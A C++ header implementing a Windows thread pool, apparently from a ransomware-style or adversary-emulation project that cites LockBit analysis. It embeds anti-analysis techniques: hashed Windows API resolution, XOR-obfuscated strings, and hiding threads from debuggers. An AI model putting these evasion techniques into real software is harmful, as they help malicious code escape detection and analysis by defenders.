#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <processthreadsapi.h>
#include <condition_variable>
#include <format>
#include <mutex>
#include <queue>
#include <tuple>
#include <vector>
#include "defense_evasion.hpp"
#include "logger.hpp"
#include "util/os_util.hpp"
#include "crypto/xor_obfuscation.hpp"

#ifndef NO_WIN_API_HASHING
    #include "util/winapihelper.hpp"
#endif

using FP_CreateThread = decltype(&CreateThread);

template <typename ...T>
DWORD threadStartRoutine(LPVOID lpThreadParameter);

// Reference: https://stackoverflow.com/a/32593825
// https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
template <typename ...T>
class ThreadPool {
    public:
        // Creates threads, which will wait for the start signal
        ThreadPool(size_t num_threads, void (*job_func)(ThreadPool*, T&...), bool hide_threads=true) {
            XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("Creating thread pool of size"), num_threads));

#ifndef NO_WIN_API_HASHING
            DWORD error_code;
            FP_CreateThread createThread = (FP_CreateThread)winapi_helper::GetAPI(0x7f08f451, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
            if (createThread == NULL || error_code != ERROR_SUCCESS) {
                throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for CreateThread. Error code"), error_code));
            }
#endif
            
            this->_job_func = job_func;
            this->_num_threads = num_threads;
            for (size_t i = 0; i < this->_num_threads; i++) {
#ifndef NO_WIN_API_HASHING
                HANDLE h_thread = createThread(NULL, 0, (LPTHREAD_START_ROUTINE)&threadStartRoutine<T...>, (LPVOID)this, 0, NULL);
#else
                HANDLE h_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&threadStartRoutine<T...>, (LPVOID)this, 0, NULL);
#endif
                if (h_thread == NULL) {
                    throw std::runtime_error(std::format("{}: {}", XOR_LIT("Thread pool failed to create thread. Error code"), GetLastError()));
                } else {
#ifndef NO_WIN_API_HASHING
                    if (hide_threads) {
                        defense_evasion::HideThreadFromDebugger(h_thread);
                        XorLogger::LogDebug(XOR_LIT("Successfully hid thread from debugger."));
                    }
#endif
                    this->_pool.push_back(h_thread);
                }
            }
        }

        // Start the threads
        void Start() {
            { // Critical section
                std::lock_guard lk(this->_start_signal_mutex);
                this->_start = true;
            } // End of critical section
            this->_start_cv.notify_all();
        }

        // Add job to thread pool queue
        void QueueJob(T&... job_args) {
            { // Critical section
                std::unique_lock lk(this->_job_mutex);
                this->_job_queue.push(std::tuple<T...>(job_args...));
            } // end critical section
            _job_cv.notify_one();
        }

        // Wait for threads to complete
        void Join() {
#ifndef NO_WIN_API_HASHING
            DWORD error_code;
            FP_WaitForSingleObject waitForSingleObject = (FP_WaitForSingleObject)winapi_helper::GetAPI(0xeccda1ba, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
            if (waitForSingleObject == NULL || error_code != ERROR_SUCCESS) {
                XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for WaitForSingleObject. Error code"), error_code));
                return;
            }
#endif
            // wait on threads and clear thread pool
            for (HANDLE t: this->_pool) {
#ifndef NO_WIN_API_HASHING
                DWORD result = waitForSingleObject(t, INFINITE);
#else
                DWORD result = WaitForSingleObject(t, INFINITE);
#endif
                if (result == WAIT_FAILED) {
                    XorLogger::LogError(std::format("{}: {}", XOR_LIT("WaitForSingleObject failed on thread. Error code"), GetLastError()));
                } else {
                    XorLogger::LogDebug(XOR_LIT("Waited for thread completion. Closing thread handle."));
                    CloseHandle(t);
                }
            }
            this->_pool.clear();
        }

        void GetAndExecuteJobs() {
            this->getAndExecuteJobs();
        }

    private:
        void (*_job_func)(ThreadPool*, T&...);
        std::vector<HANDLE> _pool;
        int _num_threads = 0;

        std::mutex _job_mutex; // protects _job_queue, job_cv, _num_idle_threads, _finished
        std::queue<std::tuple<T...>> _job_queue;
        std::condition_variable _job_cv;
        int _num_idle_threads = 0;
        bool _finished = false;

        std::mutex _start_signal_mutex; // protects _start_cv, _start
        std::condition_variable _start_cv;
        bool _start = false;
        
        void getAndExecuteJobs() {
            bool notify_finish = false;

            // Wait until the start signal is set before polling the job queue
            waitForStartSignal();
            
            while (true) {
                std::tuple<T...> job_args;

                { // critical section
                    std::unique_lock lk(this->_job_mutex);

                    if (this->_job_queue.empty()) {
                        this->_num_idle_threads++;

                        // If this is the last thread to become idle, then thread pool is finished
                        if (this->_num_idle_threads == this->_num_threads) {
                            this->_finished = true;
                            notify_finish = true;
                            break;
                        }

                        // Wait until the thread pool is done, or a job becomes available
                        _job_cv.wait(lk, [this] { return !this->_job_queue.empty() || this->_finished; });
                        
                        if (this->_finished) {
                            return;
                        }

                        this->_num_idle_threads--;
                    }

                    // grab first available job
                    job_args = this->_job_queue.front();
                    this->_job_queue.pop();
                } // end critical section

                // execute job
                try {
                    std::apply([this](T&... args) { this->_job_func(this, args...); }, job_args);
                } catch (const std::runtime_error& ex) {
                    XorLogger::LogError(std::format(
                        "{} {}: {}", 
                        XOR_LIT("Runtime error when executing job in thread"), 
                        os_util::GetThreadIdStr(), 
                        ex.what()
                    ));
                } catch (const std::exception& ex) {
                    XorLogger::LogError(std::format(
                        "{} {}: {}", 
                        XOR_LIT("Exception occurred when executing job in thread"), 
                        os_util::GetThreadIdStr(), 
                        ex.what()
                    ));
                } catch (...) {
                    XorLogger::LogError(std::format(
                        "{} {}", 
                        XOR_LIT("Unknown error occurred when executing job in thread"), 
                        os_util::GetThreadIdStr()
                    ));
                }
            }

            // Last thread to become idle must notify the other threads that thread pool is done
            if (notify_finish) {
                this->_job_cv.notify_all();
            }
        }

        void waitForStartSignal() {
            // critical section
            std::unique_lock lk(this->_start_signal_mutex); 
            this->_start_cv.wait(lk, [this] { return this->_start; });
            // end critical section
        }
};

template <typename ...T>
DWORD threadStartRoutine(LPVOID lpThreadParameter) {
   ThreadPool<T...>* pool = (ThreadPool<T...>*)lpThreadParameter;
   pool->GetAndExecuteJobs();
   return ERROR_SUCCESS;
}